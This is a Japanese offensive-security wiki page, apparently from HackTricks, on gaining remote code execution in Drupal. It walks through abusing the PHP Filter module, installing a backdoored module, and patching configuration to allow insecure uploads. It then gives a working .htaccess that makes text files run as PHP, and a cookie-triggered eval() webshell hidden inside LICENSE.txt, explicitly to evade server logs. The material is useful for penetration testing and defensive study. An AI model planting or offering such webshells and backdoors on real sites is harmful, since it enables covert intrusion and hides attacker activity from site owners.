# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## PHPフィルターモジュールを使用して

> [!WARNING]
> 古いバージョンのDrupal **(バージョン8以前)** では、管理者としてログインし、**`PHPフィルタ`モジュールを有効にする**ことが可能でした。このモジュールは「埋め込まれたPHPコード/スニペットを評価することを許可します。」しかし、バージョン8からはこのモジュールはデフォルトでインストールされていません。

1. **/modules/php**に移動し、403エラーが返された場合は、**PHPフィルタープラグインがインストールされており、続行できます**
1. そうでない場合は、`Modules`に移動し、`PHP Filter`のボックスにチェックを入れてから`Save configuration`をクリックします
2. 次に、これを悪用するために、`Add content`をクリックし、`Basic Page`または`Article`を選択し、**PHPバックドア**を書き込み、テキスト形式で`PHP`コードを選択し、最後に`Preview`を選択します
3. それをトリガーするには、新しく作成されたノードにアクセスするだけです:
```bash
curl http://drupal.local/node/3
```
## PHPフィルターモジュールのインストール

> [!WARNING]
> 現在のバージョンでは、デフォルトのインストール後にウェブへのアクセスのみでプラグインをインストールすることはできなくなりました。

バージョン**8以降、** [**PHPフィルター**](https://www.drupal.org/project/php/releases/8.x-1.1) **モジュールはデフォルトでインストールされていません**。この機能を利用するには、**自分でモジュールをインストールする必要があります**。

1. Drupalウェブサイトからモジュールの最新バージョンをダウンロードします。
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. ダウンロードが完了したら、**`管理`** > **`レポート`** > **`利用可能な更新`**に移動します。
3. **`参照`**をクリックし、ダウンロードしたディレクトリからファイルを選択し、次に**`インストール`**をクリックします。
4. モジュールがインストールされたら、**`コンテンツ`**をクリックし、Drupal 7の例と同様に**新しい基本ページを作成**します。再度、**`テキストフォーマット`**のドロップダウンから**`PHPコード`**を**選択**することを忘れないでください。

## バックドア付きモジュール

> [!WARNING]
> 現在のバージョンでは、デフォルトのインストール後にウェブへのアクセスのみでプラグインをインストールすることはできなくなりました。

**モジュールをダウンロード**し、**バックドア**を追加して**インストール**することが可能でした。例えば、圧縮形式で[**Trurnstile**](https://www.drupal.org/project/turnstile)モジュールをダウンロードし、その中に新しいPHPバックドアファイルを作成し、`.htaccess`ファイルを使用してPHPファイルにアクセスできるようにします：
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
そして、**`http://drupal.local/admin/modules/install`** に移動して、バックドア付きモジュールをインストールし、**`/modules/turnstile/back.php`** にアクセスして実行します。

## 設定同期を使用したDrupalのバックドア <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**投稿者** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### パート1 (_Media_ と _Media Library_ の有効化)

_Extend_ メニュー (/admin/modules) では、すでにインストールされていると思われるプラグインを有効化できます。デフォルトでは、プラグイン _Media_ と _Media Library_ は有効化されていないようなので、有効化しましょう。

有効化前:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

有効化後:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### パート2 (_Configuration synchronization_ 機能の活用) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

私たちは _Configuration synchronization_ 機能を利用して、Drupalの設定エントリをダンプ（エクスポート）し、アップロード（インポート）します：

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**system.file.ymlのパッチ**

最初のエントリ `allow_insecure_uploads` をパッチすることから始めましょう：

ファイル: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

に:

ファイル: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**パッチ field.field.media.document.field_media_document.yml**

次に、2番目のエントリ `file_extensions` を以下のようにパッチします：

File: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

に:

ファイル: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> このブログ投稿では使用していませんが、`file_directory`を任意の方法で定義でき、パス・トラバーサル攻撃に対して脆弱であることが指摘されています（これにより、Drupalファイルシステムツリー内で上に戻ることができます）。

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### パート 3 (機能 _ドキュメントの追加_ を活用する) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

最後のステップは最も簡単で、2つのサブステップに分かれています。最初は、Apacheディレクティブを活用し、.txtファイルがPHPエンジンによって解釈されるようにするために、.htaccess形式のファイルをアップロードします。2つ目は、ペイロードを含む.txtファイルをアップロードすることです。

ファイル: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
このトリックがクールな理由は何ですか？

WebサーバーにWebshell（LICENSE.txtと呼ぶことにします）をドロップすると、`$_COOKIE`を介してコマンドを送信でき、Webサーバーログにはテキストファイルへの正当なGETリクエストとして表示されるからです。

なぜWebshellをLICENSE.txtと名付けるのですか？

単純に、例えば[core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)（これはDrupalコアにすでに存在するファイル）を取ると、339行でサイズが17.6 KBのファイルがあり、真ん中に小さなPHPコードのスニペットを追加するのに最適です（ファイルが十分に大きいため）。

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ファイル: パッチを当てたLICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **パート 3.1 (ファイル .htaccess のアップロード)**

まず、_Add Document_ (/media/add/document) 機能を利用して、Apache ディレクティブを含むファイル (.htaccess) をアップロードします。

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**パート 3.2 (ファイル LICENSE.txt のアップロード)**

次に、_Add Document_ (/media/add/document) 機能を再度利用して、ライセンスファイル内に隠された Webshell をアップロードします。

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### パート 4 (Webshell とのインタラクション) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

最後の部分は、Webshell とのインタラクションです。

以下のスクリーンショットに示されているように、Webshell によって期待されるクッキーが定義されていない場合、Web ブラウザを介してファイルを参照すると、次の結果が得られます。

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

攻撃者がクッキーを設定すると、Webshell とインタラクションし、任意のコマンドを実行できます。

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

そして、ログに見ると、要求されたのは txt ファイルだけのようです。

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

この記事を読んでいただきありがとうございます。シェルを取得するのに役立つことを願っています。

{{#include ../../../banners/hacktricks-training.md}}
